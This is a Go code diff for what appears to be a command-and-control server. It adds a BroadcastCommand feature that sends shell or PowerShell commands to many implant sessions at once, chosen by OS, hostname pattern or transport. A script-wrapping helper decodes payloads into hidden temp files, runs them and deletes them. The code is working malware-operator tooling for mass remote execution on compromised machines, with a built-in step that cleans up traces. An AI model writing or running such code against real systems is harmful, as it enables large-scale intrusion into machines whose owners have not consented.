@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -1467,4 +1468,236 @@ func (s *C2Server) SessionEventStream(req *pb.SessionEventStreamRequest, stream 
 	// Keep the stream alive and handle context cancellation
 	<-stream.Context().Done()
 	return stream.Context().Err()
+}
+
+// BroadcastCommand executes a shell command across multiple sessions with filtering
+// wrapScriptForOS wraps a script in execution commands for the target OS
+// This writes the script to a temp file, executes it, and cleans up
+func wrapScriptForOS(script, osType, extension string) string {
+	// Escape the script content for embedding
+	switch strings.ToLower(osType) {
+	case "windows":
+		if extension == "ps1" || extension == "" {
+			// PowerShell script execution
+			// Escape single quotes by doubling them
+			escapedScript := strings.ReplaceAll(script, "'", "''")
+			return fmt.Sprintf(`$s=[IO.Path]::GetTempPath()+'silkwire_'+[guid]::NewGuid().ToString('N')+'.ps1';Set-Content -Path $s -Value '%s';try{& $s}finally{Remove-Item $s -Force -ErrorAction SilentlyContinue}`, escapedScript)
+		}
+		// Batch script
+		escapedScript := strings.ReplaceAll(script, "%", "%%")
+		escapedScript = strings.ReplaceAll(escapedScript, "\n", " & ")
+		escapedScript = strings.ReplaceAll(escapedScript, "\r", "")
+		return fmt.Sprintf(`set "S=%%TEMP%%\silkwire_%%RANDOM%%.bat" && (echo %s) > "%%S%%" && call "%%S%%" && del "%%S%%"`, escapedScript)
+	default:
+		// Linux/macOS - use base64 encoding to avoid here-doc issues
+		// Base64 encode the script to avoid any escaping problems
+		encoded := base64.StdEncoding.EncodeToString([]byte(script))
+		ext := extension
+		if ext == "" {
+			ext = "sh"
+		}
+		// Use $$ (PID) and $RANDOM for unique filename, decode base64 and execute
+		return fmt.Sprintf(`S=/tmp/.sw_$$_$RANDOM.%s && echo '%s' | base64 -d > "$S" && chmod +x "$S" && "$S"; E=$?; rm -f "$S"; exit $E`, ext, encoded)
+	}
+}
+
+func (s *C2Server) BroadcastCommand(ctx context.Context, req *pb.BroadcastCommandRequest) (*pb.BroadcastCommandResponse, error) {
+	// Validate command type - only SHELL or POWERSHELL allowed for safety
+	if req.Type != pb.CommandMessage_SHELL && req.Type != pb.CommandMessage_POWERSHELL {
+		return &pb.BroadcastCommandResponse{
+			Success: false,
+			Message: "Broadcast only supports SHELL or POWERSHELL command types for safety",
+		}, nil
+	}
+
+	// Generate short broadcast ID (8 hex chars from timestamp)
+	broadcastID := fmt.Sprintf("bc_%x", time.Now().UnixNano()&0xFFFFFFFF)
+	logrus.Infof("Starting broadcast %s: command=%q type=%s", broadcastID, req.Command, req.Type.String())
+
+	// Get filtered sessions
+	filteredSessions := s.filterSessions(req.Filter)
+
+	if len(filteredSessions) == 0 {
+		return &pb.BroadcastCommandResponse{
+			Success:       false,
+			Message:       "No sessions matched the filter criteria",
+			BroadcastId:   broadcastID,
+			TotalSessions: 0,
+		}, nil
+	}
+
+	logrus.Infof("Broadcast %s: %d sessions matched filter", broadcastID, len(filteredSessions))
+
+	// Track results
+	var results []*pb.BroadcastSessionResult
+	commandsSent := 0
+	commandsFailed := 0
+
+	// Set default timeout
+	timeout := int32(60)
+	if req.TimeoutSeconds > 0 {
+		timeout = req.TimeoutSeconds
+	}
+
+	// Send command to each filtered session
+	for _, session := range filteredSessions {
+		// Short command ID: bc_XXXXXXXX_SSSS (broadcast + first 4 of session)
+		shortSession := session.ImplantID
+		if len(shortSession) > 4 {
+			shortSession = shortSession[:4]
+		}
+		commandID := fmt.Sprintf("%s_%s", broadcastID, shortSession)
+
+		// Determine the command to send
+		commandToSend := req.Command
+		cmdType := req.Type
+
+		// If this is a script, wrap it appropriately for the target OS
+		if req.IsScript {
+			commandToSend = wrapScriptForOS(req.Command, session.OS, req.ScriptExtension)
+			// For Windows PowerShell scripts, use PowerShell command type
+			if strings.ToLower(session.OS) == "windows" && (req.ScriptExtension == "ps1" || req.ScriptExtension == "") {
+				cmdType = pb.CommandMessage_POWERSHELL
+			}
+			logrus.Debugf("Wrapped script for %s (%s): %d bytes -> %d bytes",
+				session.Codename, session.OS, len(req.Command), len(commandToSend))
+		}
+
+		cmd := &pb.CommandMessage{
+			CommandId: commandID,
+			Type:      cmdType,
+			Command:   commandToSend,
+			Timeout:   timeout,
+		}
+
+		result := &pb.BroadcastSessionResult{
+			ImplantId: session.ImplantID,
+			Codename:  session.Codename,
+			Hostname:  session.Hostname,
+			CommandId: commandID,
+		}
+
+		// Save command to database
+		if err := s.db.SaveCommand(
+			commandID,
+			session.ImplantID,
+			cmd.Type.String(),
+			cmd.Command,
+			cmd.Args,
+			cmd.Data,
+			cmd.Timeout,
+		); err != nil {
+			logrus.Errorf("Error saving broadcast command to database: %v", err)
+		}
+
+		// Store pending command result in memory
+		s.resultsMux.Lock()
+		s.commandResults[commandID] = &CommandResult{
+			CommandID: commandID,
+			Success:   false,
+			Output:    "",
+			Error:     "Pending...",
+			Timestamp: time.Now(),
+		}
+		s.resultsMux.Unlock()
+
+		// Try to send via stream first, then queue as task
+		err := s.SendCommandMessage(session.ImplantID, cmd)
+		if err != nil {
+			// Try to queue as task
+			task := &pb.Task{
+				TaskId:    commandID,
+				Type:      cmd.Type,
+				Command:   cmd.Command,
+				Args:      cmd.Args,
+				Data:      cmd.Data,
+				Timeout:   cmd.Timeout,
+				CreatedAt: time.Now().Unix(),
+			}
+
+			err = s.QueueTask(session.ImplantID, task)
+			if err != nil {
+				result.Status = "failed"
+				result.Error = fmt.Sprintf("Failed to send: %v", err)
+				commandsFailed++
+
+				// Remove pending result on failure
+				s.resultsMux.Lock()
+				delete(s.commandResults, commandID)
+				s.resultsMux.Unlock()
+			} else {
+				result.Status = "queued"
+				commandsSent++
+			}
+		} else {
+			result.Status = "sent"
+			commandsSent++
+		}
+
+		results = append(results, result)
+	}
+
+	logrus.Infof("Broadcast %s complete: %d sent, %d failed", broadcastID, commandsSent, commandsFailed)
+
+	return &pb.BroadcastCommandResponse{
+		Success:        commandsSent > 0,
+		Message:        fmt.Sprintf("Broadcast sent to %d sessions (%d failed)", commandsSent, commandsFailed),
+		BroadcastId:    broadcastID,
+		TotalSessions:  int32(len(filteredSessions)),
+		CommandsSent:   int32(commandsSent),
+		CommandsFailed: int32(commandsFailed),
+		Results:        results,
+	}, nil
+}
+
+// filterSessions returns sessions that match the given filter criteria
+func (s *C2Server) filterSessions(filter *pb.BroadcastFilter) []*Session {
+	s.sessionsMux.RLock()
+	defer s.sessionsMux.RUnlock()
+
+	var filtered []*Session
+
+	for _, session := range s.sessions {
+		if s.sessionMatchesFilter(session, filter) {
+			filtered = append(filtered, session)
+		}
+	}
+
+	return filtered
+}
+
+// sessionMatchesFilter checks if a session matches the given filter criteria
+func (s *C2Server) sessionMatchesFilter(session *Session, filter *pb.BroadcastFilter) bool {
+	// If no filter provided, match all sessions
+	if filter == nil {
+		return true
+	}
+
+	// Check OS filter (case-insensitive)
+	if filter.Os != "" {
+		if !strings.EqualFold(session.OS, filter.Os) {
+			return false
+		}
+	}
+
+	// Check hostname pattern (regex)
+	if filter.HostnamePattern != "" {
+		matched, err := regexp.MatchString(filter.HostnamePattern, session.Hostname)
+		if err != nil {
+			logrus.Warnf("Invalid hostname regex pattern %q: %v", filter.HostnamePattern, err)
+			return false
+		}
+		if !matched {
+			return false
+		}
+	}
+
+	// Check transport type (case-insensitive)
+	if filter.Transport != "" {
+		if !strings.EqualFold(session.Transport, filter.Transport) {
+			return false
+		}
+	}
+
+	return true
 }
